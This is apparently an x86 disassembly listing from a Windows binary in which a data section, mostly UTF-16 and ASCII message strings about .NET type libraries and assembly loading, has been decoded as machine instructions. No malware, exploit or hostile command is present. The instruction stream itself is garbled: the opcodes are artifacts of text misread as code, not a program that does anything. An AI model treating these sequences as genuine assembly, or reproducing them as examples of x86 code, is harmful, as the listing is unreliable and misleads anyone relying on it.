  4047c9:	add    BYTE PTR [eax],al
  4047cb:	sbb    BYTE PTR [ebp+0x0],cl
  4047ce:	jae    0x4047d0
  4047d0:	add    BYTE PTR [bx+0x0],bl
  4047d4:	push   ebp
  4047d5:	add    BYTE PTR [ebx+0x0],dh
  4047d8:	popa   
  4047d9:	add    BYTE PTR [edi+0x0],ah
  4047dc:	add    BYTE PTR gs:[edi+0x0],bl
  4047e0:	xor    BYTE PTR [eax],al
  4047e2:	xor    eax,0xb5600
  4047e7:	add    BYTE PTR [eax],bl
  4047e9:	dec    ebp
  4047ea:	add    BYTE PTR [ebx+0x0],dh
  4047ed:	add    BYTE PTR [bx+0x0],bl
  4047f1:	push   ebp
  4047f2:	add    BYTE PTR [ebx+0x0],dh
  4047f5:	popa   
  4047f6:	add    BYTE PTR [edi+0x0],ah
  4047f9:	add    BYTE PTR gs:[edi+0x0],bl
  4047fd:	xor    BYTE PTR [eax],al
  4047ff:	add    BYTE PTR ss:[ebx+ecx*1+0x4d180000],dl
  404807:	add    BYTE PTR [ebx+0x0],dh
  40480a:	add    BYTE PTR [bx+0x0],bl
  40480e:	push   ebp
  40480f:	add    BYTE PTR [ebx+0x0],dh
  404812:	popa   
  404813:	add    BYTE PTR [edi+0x0],ah
  404816:	add    BYTE PTR gs:[edi+0x0],bl
  40481a:	xor    BYTE PTR [eax],al
  40481c:	aaa    
  40481d:	add    dl,dl
  40481f:	or     eax,DWORD PTR [eax]
  404821:	add    BYTE PTR [eax],bl
  404823:	dec    ebp
  404824:	add    BYTE PTR [ebx+0x0],dh
  404827:	add    BYTE PTR [bx+0x0],bl
  40482b:	push   ebp
  40482c:	add    BYTE PTR [ebx+0x0],dh
  40482f:	popa   
  404830:	add    BYTE PTR [edi+0x0],ah
  404833:	add    BYTE PTR gs:[edi+0x0],bl
  404837:	xor    BYTE PTR [eax],al
  404839:	cmp    BYTE PTR [eax],al
  40483b:	sbb    cl,BYTE PTR [eax+eax*1]
  40483e:	add    BYTE PTR [eax],bl
  404840:	dec    ebp
  404841:	add    BYTE PTR [ebx+0x0],dh
  404844:	add    BYTE PTR [bx+0x0],bl
  404848:	push   ebp
  404849:	add    BYTE PTR [ebx+0x0],dh
  40484c:	popa   
  40484d:	add    BYTE PTR [edi+0x0],ah
  404850:	add    BYTE PTR gs:[edi+0x0],bl
  404854:	xor    BYTE PTR [eax],al
  404856:	cmp    DWORD PTR [eax],eax
  404858:	pop    eax
  404859:	or     al,0x0
  40485b:	add    BYTE PTR [eax],bl
  40485d:	dec    ebp
  40485e:	add    BYTE PTR [ebx+0x0],dh
  404861:	add    BYTE PTR [bx+0x0],bl
  404865:	push   ebp
  404866:	add    BYTE PTR [ebx+0x0],dh
  404869:	popa   
  40486a:	add    BYTE PTR [edi+0x0],ah
  40486d:	add    BYTE PTR gs:[edi+0x0],bl
  404871:	xor    DWORD PTR [eax],eax
  404873:	xor    BYTE PTR [eax],al
  404875:	sahf   
  404876:	or     al,0x0
  404878:	add    BYTE PTR [eax],bl
  40487a:	dec    ebp
  40487b:	add    BYTE PTR [ebx+0x0],dh
  40487e:	add    BYTE PTR [bx+0x0],bl
  404882:	push   ebp
  404883:	add    BYTE PTR [ebx+0x0],dh
  404886:	popa   
  404887:	add    BYTE PTR [edi+0x0],ah
  40488a:	add    BYTE PTR gs:[edi+0x0],bl
  40488e:	xor    DWORD PTR [eax],eax
  404890:	xor    DWORD PTR [eax],eax
  404892:	out    0xc,eax
  404894:	add    BYTE PTR [eax],al
  404896:	sbb    BYTE PTR [ebp+0x0],cl
  404899:	jae    0x40489b
  40489b:	add    BYTE PTR [bx+0x0],bl
  40489f:	push   ebp
  4048a0:	add    BYTE PTR [ebx+0x0],dh
  4048a3:	popa   
  4048a4:	add    BYTE PTR [edi+0x0],ah
  4048a7:	add    BYTE PTR gs:[edi+0x0],bl
  4048ab:	xor    DWORD PTR [eax],eax
  4048ad:	xor    al,BYTE PTR [eax]
  4048af:	and    ecx,DWORD PTR ds:0x4d180000
  4048b5:	add    BYTE PTR [ebx+0x0],dh
  4048b8:	add    BYTE PTR [bx+0x0],bl
  4048bc:	push   ebp
  4048bd:	add    BYTE PTR [ebx+0x0],dh
  4048c0:	popa   
  4048c1:	add    BYTE PTR [edi+0x0],ah
  4048c4:	add    BYTE PTR gs:[edi+0x0],bl
  4048c8:	xor    DWORD PTR [eax],eax
  4048ca:	xor    eax,DWORD PTR [eax]
  4048cc:	ins    BYTE PTR es:[edi],dx
  4048cd:	or     eax,0x4d180000
  4048d2:	add    BYTE PTR [ebx+0x0],dh
  4048d5:	add    BYTE PTR [bx+0x0],bl
  4048d9:	push   ebp
  4048da:	add    BYTE PTR [ebx+0x0],dh
  4048dd:	popa   
  4048de:	add    BYTE PTR [edi+0x0],ah
  4048e1:	add    BYTE PTR gs:[edi+0x0],bl
  4048e5:	xor    DWORD PTR [eax],eax
  4048e7:	xor    al,0x0
  4048e9:	mov    ebx,0x3400000d
  4048ee:	push   edi
  4048ef:	add    BYTE PTR [edx+0x0],dh
  4048f2:	outs   dx,BYTE PTR ds:[esi]
  4048f3:	add    BYTE PTR [edi+0x0],bl
  4048f6:	inc    ecx
  4048f7:	add    BYTE PTR [ebx+0x0],dh
  4048fa:	jae    0x4048fc
  4048fc:	add    BYTE PTR gs:[ebp+0x0],ch
  404900:	bound  eax,QWORD PTR [eax]
  404902:	ins    BYTE PTR es:[edi],dx
  404903:	add    BYTE PTR [ecx+0x0],bh
  404906:	dec    eax
  404907:	add    BYTE PTR [ecx+0x0],ah
  40490a:	jae    0x40490c
  40490c:	inc    ebp
  40490d:	add    BYTE PTR [ebp+0x0],ch
  404910:	bound  eax,QWORD PTR [eax]
  404912:	add    BYTE PTR gs:[eax+eax*1+0x64],ah
  404917:	add    BYTE PTR [ebp+0x0],ah
  40491a:	add    BYTE PTR fs:[eax+eax*1+0x6c],dl
  40491f:	add    BYTE PTR [edx+0x0],ah
  404922:	test   DWORD PTR ds:0x572c0000,0x6e007200
  40492c:	add    BYTE PTR [edi+0x0],bl
  40492f:	inc    ebx
  404930:	add    BYTE PTR [edx+0x0],dh
  404933:	outs   dx,DWORD PTR ds:[esi]
  404934:	add    BYTE PTR [ebx+0x0],dh
  404937:	jae    0x404939
  404939:	inc    ebx
  40493a:	add    BYTE PTR [edi+0x0],ch
  40493d:	ins    DWORD PTR es:[edi],dx
  40493e:	add    BYTE PTR [eax+0x0],dh
  404941:	imul   eax,DWORD PTR [eax],0x65006c
  404947:	dec    esi
  404948:	add    BYTE PTR [edi+0x0],ch
  40494b:	push   edx
  40494c:	add    BYTE PTR [ebp+0x0],ah
  40494f:	data16 add BYTE PTR [ebx+0x0],dh
  404953:	pop    edx
  404954:	push   cs
  404955:	add    BYTE PTR [eax],al
  404957:	sub    BYTE PTR [edi+0x0],dl
  40495a:	jb     0x40495c
  40495c:	outs   dx,BYTE PTR ds:[esi]
  40495d:	add    BYTE PTR [edi+0x0],bl
  404960:	push   eax
  404961:	add    BYTE PTR [ebp+0x0],dh
  404964:	jb     0x404966
  404966:	add    BYTE PTR gs:[ebx+0x0],al
  40496a:	jb     0x40496c
  40496c:	outs   dx,DWORD PTR ds:[esi]
  40496d:	add    BYTE PTR [ebx+0x0],dh
  404970:	jae    0x404972
  404972:	inc    ebx
  404973:	add    BYTE PTR [edi+0x0],ch
  404976:	ins    DWORD PTR es:[edi],dx
  404977:	add    BYTE PTR [eax+0x0],dh
  40497a:	imul   eax,DWORD PTR [eax],0x65006c
  404980:	repz push cs
  404982:	add    BYTE PTR [eax],al
  404984:	add    DWORD PTR [esi],edx
  404986:	inc    ecx
  404987:	ins    DWORD PTR es:[edi],dx
  404988:	bound  ebp,QWORD PTR [ecx+0x67]
  40498b:	jne    0x4049fc
  40498d:	jne    0x404a02
  40498f:	and    BYTE PTR [edi+0x70],ch
  404992:	je     0x4049fd
  404994:	outs   dx,DWORD PTR ds:[esi]
  404995:	outs   dx,BYTE PTR ds:[esi]
  404996:	cmp    ah,BYTE PTR [eax]
  404998:	das    
  404999:	jnp    0x4049cb
  40499b:	jge    0x40499e
  40499d:	ss inc ebp
  40499f:	jb     0x404a13
  4049a1:	outs   dx,DWORD PTR ds:[esi]
  4049a2:	jb     0x4049c4
  4049a4:	arpl   WORD PTR [edx+0x65],si
  4049a7:	popa   
  4049a8:	je     0x404a13
  4049aa:	outs   dx,BYTE PTR ds:[esi]
  4049ab:	and    BYTE PTR [bx+di+0x6e],ah
  4049af:	and    BYTE PTR [ecx+0x70],ah
  4049b2:	jo     0x4049d4
  4049b4:	outs   dx,DWORD PTR fs:[esi]
  4049b6:	ins    DWORD PTR es:[edi],dx
  4049b7:	popa   
  4049b8:	imul   ebp,DWORD PTR [esi+0x20],0x70206f74
  4049bf:	gs jb  0x404a28
  4049c2:	outs   dx,DWORD PTR ds:[esi]
  4049c3:	jb     0x404a32
  4049c5:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4049c9:	and    BYTE PTR [ebx+0x6f],ah
  4049cc:	outs   dx,BYTE PTR ds:[esi]
  4049cd:	jbe    0x404a34
  4049cf:	jb     0x404a44
  4049d1:	imul   ebp,DWORD PTR [edi+0x6e],0x6e554701
  4049d8:	popa   
  4049d9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x20]
  4049dd:	je     0x404a4e
  4049df:	and    BYTE PTR [edi+ebp*2+0x61],ch
  4049e3:	and    BYTE PTR fs:[eax+ebp*2+0x65],dh
  4049e8:	and    BYTE PTR [edx+0x65],dl
  4049eb:	ins    DWORD PTR es:[edi],dx
  4049ec:	outs   dx,DWORD PTR ds:[esi]
  4049ed:	je     0x404a54
  4049ef:	push   esp
  4049f0:	ins    BYTE PTR es:[edi],dx
  4049f1:	bound  eax,QWORD PTR [ebp+0x78]
  4049f4:	jo     0x404a16
  4049f6:	je     0x404a71
  4049f8:	jo     0x404a5f
  4049fa:	and    BYTE PTR [edx+0x65],dh
  4049fd:	jno    0x404a74
  4049ff:	imul   esi,DWORD PTR [edx+0x65],0x6f742064
  404a06:	and    BYTE PTR [eax+0x65],dh
  404a09:	jb     0x404a71
  404a0b:	outs   dx,DWORD PTR ds:[esi]
  404a0c:	jb     0x404a7b
  404a0e:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404a12:	and    BYTE PTR [ebx+0x6f],ah
  404a15:	outs   dx,BYTE PTR ds:[esi]
  404a16:	jbe    0x404a7d
  404a18:	jb     0x404a8d
  404a1a:	imul   ebp,DWORD PTR [edi+0x6e],0x68544601
  404a21:	and    BYTE PTR gs:[esi+0x6f],ah
  404a25:	ins    BYTE PTR es:[edi],dx
  404a26:	ins    BYTE PTR es:[edi],dx
  404a27:	outs   dx,DWORD PTR ds:[esi]
  404a28:	ja     0x404a93
  404a2a:	outs   dx,BYTE PTR ds:[esi]
  404a2b:	and    BYTE PTR [di+0x72],ah
  404a2f:	jb     0x404aa0
  404a31:	jb     0x404a53
  404a33:	outs   dx,DWORD PTR ds:[esi]
  404a34:	arpl   WORD PTR [ebx+0x75],sp
  404a37:	jb     0x404aab
  404a39:	gs and BYTE PTR fs:[edi+0x68],dh
  404a3e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x69766173
  404a46:	outs   dx,BYTE PTR ds:[esi]
  404a47:	and    BYTE PTR [si+0x68],dh
  404a4b:	and    BYTE PTR gs:[ebp+0x78],ah
  404a4f:	jo     0x404ac0
  404a51:	jb     0x404ac7
  404a53:	gs and BYTE PTR fs:[ecx+edi*2+0x70],dh
  404a59:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  404a5e:	jb     0x404ac1
  404a60:	jb     0x404adb
  404a62:	cmp    cl,BYTE PTR ds:0x5522010a
  404a68:	outs   dx,BYTE PTR ds:[esi]
  404a69:	popa   
  404a6a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x20]
  404a6e:	je     0x404adf
  404a70:	and    BYTE PTR [edi+ebp*2+0x63],ch
  404a74:	popa   
  404a75:	je     0x404adc
  404a77:	and    BYTE PTR [ecx+0x6e],ch
  404a7a:	jo     0x404af1
  404a7c:	je     0x404a9e
  404a7e:	imul   bp,WORD PTR [ebp+eiz*2+0x3a],0x2720
  404a85:	jnp    0x404ab7
  404a87:	jge    0x404ab0
  404a89:	add    DWORD PTR [edi],ecx
  404a8b:	dec    ecx
  404a8c:	outs   dx,BYTE PTR ds:[esi]
  404a8d:	je     0x404af4
  404a8f:	jb     0x404aff
  404a91:	popa   
  404a92:	ins    BYTE PTR es:[edi],dx
  404a93:	and    BYTE PTR [ebp+0x72],al
  404a96:	jb     0x404b07
  404a98:	jb     0x404ac8
  404a9a:	add    DWORD PTR [esi+eax*2],edi
  404a9d:	popa   
  404a9e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  404aa6:	ins    BYTE PTR es:[edi],dx
  404aa7:	outs   dx,DWORD PTR ds:[esi]
  404aa8:	popa   
  404aa9:	and    BYTE PTR fs:[edi],ah
  404aac:	jnp    0x404ade
  404aae:	jge    0x404ad7
  404ab0:	and    BYTE PTR [edx+0x65],ah
  404ab3:	arpl   WORD PTR [ecx+0x75],sp
  404ab6:	jae    0x404b1d
  404ab8:	and    BYTE PTR [ecx+0x74],ch
  404abb:	and    BYTE PTR [ecx+0x73],ch
  404abe:	and    BYTE PTR [esi+0x6f],ch
  404ac1:	je     0x404ae3
  404ac3:	popa   
  404ac4:	and    BYTE PTR [esi+0x61],dh
  404ac7:	ins    BYTE PTR es:[edi],dx
  404ac8:	imul   esp,DWORD PTR [eax+eiz*1+0x2e],0x2054454e
  404ad0:	popa   
  404ad1:	jae    0x404b46
  404ad3:	gs ins DWORD PTR es:[edi],dx
  404ad5:	bound  ebp,QWORD PTR [ecx+edi*2+0x1]
  404ad9:	and    al,0x41
  404adb:	outs   dx,BYTE PTR ds:[esi]
  404adc:	and    BYTE PTR [ecx+0x6e],ch
  404adf:	jbe    0x404b42
  404ae1:	ins    BYTE PTR es:[edi],dx
  404ae2:	imul   esp,DWORD PTR [eax+eiz*1+0x6f],0x6f697470
  404aea:	outs   dx,BYTE PTR ds:[esi]
  404aeb:	and    BYTE PTR [eax+0x61],ch
  404aee:	jae    0x404b10
  404af0:	bound  esp,QWORD PTR [ebp+0x65]
  404af3:	outs   dx,BYTE PTR ds:[esi]
  404af4:	and    BYTE PTR [ebx+0x70],dh
  404af7:	arpl   WORD PTR gs:[ecx+0x66],bp
  404afb:	imul   esp,DWORD PTR [ebp+0x64],0x68543501
  404b02:	and    BYTE PTR gs:[ebx+0x70],dh
  404b06:	arpl   WORD PTR gs:[ecx+0x66],bp
  404b0a:	imul   esp,DWORD PTR [ebp+0x64],0x61727420
  404b11:	outs   dx,BYTE PTR ds:[esi]
  404b12:	jae    0x404b7a
  404b14:	outs   dx,DWORD PTR ds:[esi]
  404b15:	jb     0x404b84
  404b17:	popa   
  404b18:	je     0x404b83
  404b1a:	outs   dx,DWORD PTR ds:[esi]
  404b1b:	outs   dx,BYTE PTR ds:[esi]
  404b1c:	and    BYTE PTR [edi+0x70],ch
  404b1f:	je     0x404b8a
  404b21:	outs   dx,DWORD PTR ds:[esi]
  404b22:	outs   dx,BYTE PTR ds:[esi]
  404b23:	and    BYTE PTR [edi],ah
  404b25:	jnp    0x404b57
  404b27:	jge    0x404b50
  404b29:	and    BYTE PTR [ecx+0x73],ch
  404b2c:	and    BYTE PTR [ecx+0x6e],ch
  404b2f:	jbe    0x404b92
  404b31:	ins    BYTE PTR es:[edi],dx
  404b32:	imul   esp,DWORD PTR [esi+ebp*1+0x1],0x206f4e20
  404b3a:	imul   ebp,DWORD PTR [esi+0x70],0x66207475
  404b41:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x20736168
  404b49:	bound  esp,QWORD PTR [ebp+0x65]
  404b4c:	outs   dx,BYTE PTR ds:[esi]
  404b4d:	and    BYTE PTR [ebx+0x70],dh
  404b50:	arpl   WORD PTR gs:[ecx+0x66],bp
  404b54:	imul   esp,DWORD PTR [ebp+0x64],0x68542801
  404b5b:	and    BYTE PTR gs:[edi],ch
  404b5e:	jnp    0x404b90
  404b60:	jge    0x404b82
  404b62:	outs   dx,DWORD PTR ds:[esi]
  404b63:	jo     0x404bd9
  404b65:	imul   ebp,DWORD PTR [edi+0x6e],0x656f6420
  404b6c:	jae    0x404b8e
  404b6e:	outs   dx,BYTE PTR ds:[esi]
  404b6f:	outs   dx,DWORD PTR ds:[esi]
  404b70:	je     0x404b92
  404b72:	jb     0x404bd9
  404b74:	jno    0x404beb
  404b76:	imul   esi,DWORD PTR [edx+0x65],0x76206120
  404b7d:	popa   
  404b7e:	ins    BYTE PTR es:[edi],dx
  404b7f:	jne    0x404be6
  404b81:	add    DWORD PTR [edi],ebp
  404b83:	dec    edi
  404b84:	outs   dx,BYTE PTR ds:[esi]
  404b85:	ins    BYTE PTR es:[edi],dx
  404b86:	jns    0x404ba8
  404b88:	outs   dx,DWORD PTR ds:[esi]
  404b89:	outs   dx,BYTE PTR ds:[esi]
  404b8a:	and    BYTE PTR gs:[edi+0x66],ch
  404b8e:	and    BYTE PTR [edi],ch
  404b90:	ja     0x404bfb
  404b92:	outs   dx,BYTE PTR ds:[esi]
  404b93:	xor    esi,DWORD PTR [edx]
  404b95:	and    BYTE PTR [ecx+0x6e],ah
  404b98:	and    BYTE PTR fs:[edi],ch
  404b9b:	ja     0x404c06
  404b9d:	outs   dx,BYTE PTR ds:[esi]
  404b9e:	ss xor al,0x20
  404ba1:	ins    DWORD PTR es:[edi],dx
  404ba2:	popa   
  404ba3:	jns    0x404bc5
  404ba5:	bound  esp,QWORD PTR [ebp+0x20]
  404ba8:	jae    0x404c1a
  404baa:	arpl   WORD PTR gs:[ecx+0x66],bp
  404bae:	imul   esp,DWORD PTR [ebp+0x64],0x4f26012e
  404bb5:	jne    0x404c2b
  404bb7:	jo     0x404c2e
  404bb9:	je     0x404bdb
  404bbb:	imul   bp,WORD PTR [ebp+eiz*2+0x20],0x6f77
  404bc2:	jne    0x404c30
  404bc4:	and    BYTE PTR fs:[edi+0x76],ch
  404bc8:	gs jb  0x404c42
  404bcb:	jb     0x404c36
  404bcd:	je     0x404c34
  404bcf:	and    BYTE PTR [ecx+0x6e],ch
  404bd2:	jo     0x404c49
  404bd4:	je     0x404bf6
  404bd6:	imul   bp,WORD PTR [ebp+eiz*2+0x1],0x546a
  404bdd:	push   0x6f662065
  404be2:	ins    BYTE PTR es:[edi],dx
  404be3:	ins    BYTE PTR es:[edi],dx
  404be4:	outs   dx,DWORD PTR ds:[esi]
  404be5:	ja     0x404c50
  404be7:	outs   dx,BYTE PTR ds:[esi]
  404be8:	and    BYTE PTR [bp+si+0x65],dh
  404bec:	data16 gs jb 0x404c55
  404bf0:	outs   dx,BYTE PTR ds:[esi]
  404bf1:	arpl   WORD PTR [ebp+0x64],sp
  404bf4:	and    BYTE PTR [ecx+0x73],ah
  404bf7:	jae    0x404c5e
  404bf9:	ins    DWORD PTR es:[edi],dx
  404bfa:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  404bfe:	arpl   WORD PTR [edi+0x75],bp
  404c01:	ins    BYTE PTR es:[edi],dx
  404c02:	and    BYTE PTR fs:[esi+0x6f],ch
  404c06:	je     0x404c28
  404c08:	bound  esp,QWORD PTR [ebp+0x20]
  404c0b:	ins    BYTE PTR es:[edi],dx
  404c0c:	outs   dx,DWORD PTR ds:[esi]
  404c0d:	arpl   WORD PTR [ecx+0x74],sp
  404c10:	gs and BYTE PTR fs:[ecx+0x6e],ch
  404c15:	and    BYTE PTR [ecx+0x6e],ah
  404c18:	jns    0x404c3a
  404c1a:	outs   dx,DWORD PTR ds:[esi]
  404c1b:	data16 and BYTE PTR [eax+ebp*2+0x65],dh
  404c20:	and    BYTE PTR [edi+ebp*2+0x63],ch
  404c24:	popa   
  404c25:	je     0x404c90
  404c27:	outs   dx,DWORD PTR ds:[esi]
  404c28:	outs   dx,BYTE PTR ds:[esi]
  404c29:	jae    0x404c4b
  404c2b:	jae    0x404c9d
  404c2d:	arpl   WORD PTR gs:[ecx+0x66],bp
  404c31:	imul   esp,DWORD PTR [ebp+0x64],0x61697620
  404c38:	and    BYTE PTR [edi],ch
  404c3a:	popa   
  404c3b:	jae    0x404caa
  404c3d:	jo     0x404ca0
  404c3f:	je     0x404ca9
  404c41:	cmp    ah,BYTE PTR [eax]
  404c43:	jnp    0x404c75
  404c45:	jge    0x404c48
  404c47:	add    BYTE PTR [ecx],0x54
  404c4a:	push   0x65722065
  404c4f:	data16 gs jb 0x404cb8
  404c53:	outs   dx,BYTE PTR ds:[esi]
  404c54:	arpl   WORD PTR [ebp+0x20],sp
  404c57:	outs   dx,WORD PTR ds:[esi]
  404c59:	jb     0x404c7b
  404c5b:	je     0x404cd6
  404c5d:	jo     0x404cc4
  404c5f:	and    BYTE PTR [ecx+ebp*2+0x62],ch
  404c63:	jb     0x404cc6
  404c65:	jb     0x404ce0
  404c67:	and    BYTE PTR [edi+0x69],dh
  404c6a:	je     0x404cd4
  404c6c:	and    BYTE PTR [ebx+0x69],dh
  404c6f:	ins    DWORD PTR es:[edi],dx
  404c70:	jo     0x404cde
  404c72:	and    BYTE PTR gs:[esi+0x61],ch
  404c76:	ins    DWORD PTR es:[edi],dx
  404c77:	and    BYTE PTR gs:[edi],ah
  404c7a:	jnp    0x404cac
  404c7c:	jge    0x404ca5
  404c7e:	sub    al,0x20
  404c80:	push   esp
  404c81:	dec    esp
  404c82:	inc    edx
  404c83:	dec    ecx
  404c84:	inc    esp
  404c85:	and    BYTE PTR [ebx+0x31],bh
  404c88:	jge    0x404caa
  404c8a:	popa   
  404c8b:	outs   dx,BYTE PTR ds:[esi]
  404c8c:	and    BYTE PTR fs:[esi+0x65],dh
  404c90:	jb     0x404d05
  404c92:	imul   ebp,DWORD PTR [edi+0x6e],0x7d327b20
  404c99:	and    BYTE PTR [ecx+0x73],ch
  404c9c:	and    BYTE PTR [esi+0x6f],ch
  404c9f:	je     0x404cc1
  404ca1:	imul   ebp,DWORD PTR [esi+0x20],0x20656874
  404ca8:	ins    BYTE PTR es:[edi],dx
  404ca9:	imul   esi,DWORD PTR [ebx+0x74],0x20666f20
  404cb0:	jb     0x404d17
  404cb2:	data16 gs jb 0x404d1b
  404cb6:	outs   dx,BYTE PTR ds:[esi]
  404cb7:	arpl   WORD PTR [ebp+0x64],sp
  404cba:	and    BYTE PTR [ecx+edi*2+0x70],dh
  404cbe:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  404cc3:	jb     0x404d26
  404cc5:	jb     0x404d30
  404cc7:	gs jae 0x404ccb
  404cca:	test   DWORD PTR [ecx],eax
  404ccc:	push   esp
  404ccd:	push   0x79742065
  404cd2:	jo     0x404d39
  404cd4:	and    BYTE PTR [ecx+ebp*2+0x62],ch
  404cd8:	jb     0x404d3b
  404cda:	jb     0x404d55
  404cdc:	and    BYTE PTR [esi+0x6f],ah
  404cdf:	jb     0x404d01
  404ce1:	jb     0x404d48
  404ce3:	data16 gs jb 0x404d4c
  404ce7:	outs   dx,BYTE PTR ds:[esi]
  404ce8:	arpl   WORD PTR [ebp+0x64],sp
  404ceb:	and    BYTE PTR [ecx+0x73],ah
  404cee:	jae    0x404d55
  404cf0:	ins    DWORD PTR es:[edi],dx
  404cf1:	bound  ebp,QWORD PTR [ecx+edi*2+0x2c]
  404cf5:	and    BYTE PTR [edi],ah
  404cf7:	jnp    0x404d29
  404cf9:	jge    0x404d22
  404cfb:	sub    al,0x20
  404cfd:	ja     0x404d68
  404cff:	ins    BYTE PTR es:[edi],dx
  404d00:	ins    BYTE PTR es:[edi],dx
  404d01:	and    BYTE PTR [esi+0x6f],ch
  404d04:	je     0x404d26
  404d06:	bound  esp,QWORD PTR [ebp+0x20]
  404d09:	gs js  0x404d7c
  404d0c:	outs   dx,DWORD PTR ds:[esi]
  404d0d:	jb     0x404d83
  404d0f:	gs and BYTE PTR fs:[ebx+0x69],dh
  404d14:	outs   dx,BYTE PTR ds:[esi]
  404d15:	arpl   WORD PTR [ebp+0x20],sp
  404d18:	imul   esi,DWORD PTR [eax+eiz*1+0x77],0x646c756f
  404d20:	and    BYTE PTR [edx+0x65],ah
  404d23:	and    BYTE PTR [edi+0x76],ch
  404d26:	gs jb  0x404da0
  404d29:	jb     0x404d94
  404d2b:	je     0x404da1
  404d2d:	outs   dx,BYTE PTR gs:[esi]
  404d2f:	and    BYTE PTR [edx+0x79],ah
  404d32:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404d36:	and    BYTE PTR [edi+0x75],ch
  404d39:	je     0x404dab
  404d3b:	jne    0x404db1
  404d3d:	and    BYTE PTR [ecx+edi*2+0x70],dh
  404d41:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  404d46:	jb     0x404da9
  404d48:	jb     0x404dc3
  404d4a:	and    BYTE PTR [edi],ah
  404d4c:	jnp    0x404d7f
  404d4e:	jge    0x404d77
  404d50:	add    DWORD PTR cs:[edi+0x54],ecx
  404d54:	jns    0x404dc6
  404d56:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  404d5b:	jb     0x404dbe
  404d5d:	jb     0x404dd8
  404d5f:	and    BYTE PTR [esi+0x6f],ah
  404d62:	jb     0x404d84
  404d64:	popa   
  404d65:	jae    0x404dda
  404d67:	gs ins DWORD PTR es:[edi],dx
  404d69:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  404d6d:	daa    
  404d6e:	jnp    0x404da0
  404d70:	jge    0x404d99
  404d72:	and    BYTE PTR [ecx+0x73],ch
  404d75:	and    BYTE PTR [esi+0x6f],ch
  404d78:	je     0x404d9a
  404d7a:	imul   ebp,DWORD PTR [esi+0x20],0x20656874
  404d81:	ins    BYTE PTR es:[edi],dx
  404d82:	imul   esi,DWORD PTR [ebx+0x74],0x20666f20
  404d89:	jb     0x404df0
  404d8b:	data16 gs jb 0x404df4
  404d8f:	outs   dx,BYTE PTR ds:[esi]
  404d90:	arpl   WORD PTR [ebp+0x64],sp
  404d93:	and    BYTE PTR [ecx+edi*2+0x70],dh
  404d97:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  404d9c:	jb     0x404dff
  404d9e:	jb     0x404e09
  404da0:	gs jae 0x404da4
  404da3:	xor    eax,0x6f727245
  404da8:	jb     0x404dca
  404daa:	outs   dx,DWORD PTR ds:[esi]
  404dab:	arpl   WORD PTR [ebx+0x75],sp
  404dae:	jb     0x404e22
  404db0:	gs and BYTE PTR fs:[edi+0x68],dh
  404db5:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x6e65706f
  404dbd:	imul   ebp,DWORD PTR [esi+0x67],0x70797420
  404dc4:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  404dc9:	jb     0x404e2c
  404dcb:	jb     0x404e46
  404dcd:	and    BYTE PTR [edi],ah
  404dcf:	jnp    0x404e01
  404dd1:	jge    0x404dfa
  404dd3:	cmp    cl,BYTE PTR ds:0x7d317b0a
  404dd9:	add    DWORD PTR [edx+0x54],edx
  404ddc:	jns    0x404e4e
  404dde:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  404de3:	jb     0x404e46
  404de5:	jb     0x404e60
  404de7:	and    BYTE PTR [edi],ah
  404de9:	jnp    0x404e1b
  404deb:	jge    0x404e14
  404ded:	and    BYTE PTR [ecx+0x73],ch
  404df0:	and    BYTE PTR [ecx+0x20],ah
  404df3:	fs jne 0x404e66
  404df6:	ins    BYTE PTR es:[edi],dx
  404df7:	imul   esp,DWORD PTR [ebx+0x61],0x6f206574
  404dfe:	data16 and BYTE PTR [ecx+0x6e],ah
  404e02:	outs   dx,DWORD PTR ds:[esi]
  404e03:	je     0x404e6d
  404e05:	gs jb  0x404e28
  404e08:	je     0x404e83
  404e0a:	jo     0x404e71
  404e0c:	and    BYTE PTR [ecx+ebp*2+0x62],ch
  404e10:	jb     0x404e73
  404e12:	jb     0x404e8d
  404e14:	and    BYTE PTR [edi+ebp*2+0x61],ch
  404e18:	fs gs and BYTE PTR fs:[esi+0x69],dh
  404e1e:	popa   
  404e1f:	and    BYTE PTR [edi],ch
  404e21:	je     0x404e8f
  404e23:	bound  esi,QWORD PTR [edx+0x65]
  404e26:	data16 gs jb 0x404e8f
  404e2a:	outs   dx,BYTE PTR ds:[esi]
  404e2b:	arpl   WORD PTR [ebp+0x1],sp
  404e2e:	dec    edi
  404e2f:	push   esp
  404e30:	push   0x6f662065
  404e35:	ins    BYTE PTR es:[edi],dx
  404e36:	ins    BYTE PTR es:[edi],dx
  404e37:	outs   dx,DWORD PTR ds:[esi]
  404e38:	ja     0x404ea3
  404e3a:	outs   dx,BYTE PTR ds:[esi]
  404e3b:	and    BYTE PTR [di+0x78],ah
  404e3f:	arpl   WORD PTR [ebp+0x70],sp
  404e42:	je     0x404ead
  404e44:	outs   dx,DWORD PTR ds:[esi]
  404e45:	outs   dx,BYTE PTR ds:[esi]
  404e46:	jae    0x404e68
  404e48:	ja     0x404eaf
  404e4a:	jb     0x404eb1
  404e4c:	and    BYTE PTR [eax+ebp*2+0x72],dh
  404e50:	outs   dx,DWORD PTR ds:[esi]
  404e51:	ja     0x404ec1
  404e53:	and    BYTE PTR [edi+0x68],dh
  404e56:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x64616f6c
  404e5e:	imul   ebp,DWORD PTR [esi+0x67],0x65687420
  404e65:	and    BYTE PTR [ecx+edi*2+0x70],dh
  404e69:	gs jae 0x404e8c
  404e6c:	imul   ebp,DWORD PTR [esi+0x20],0x20656874
  404e73:	popa   
  404e74:	jae    0x404ee9
  404e76:	gs ins DWORD PTR es:[edi],dx
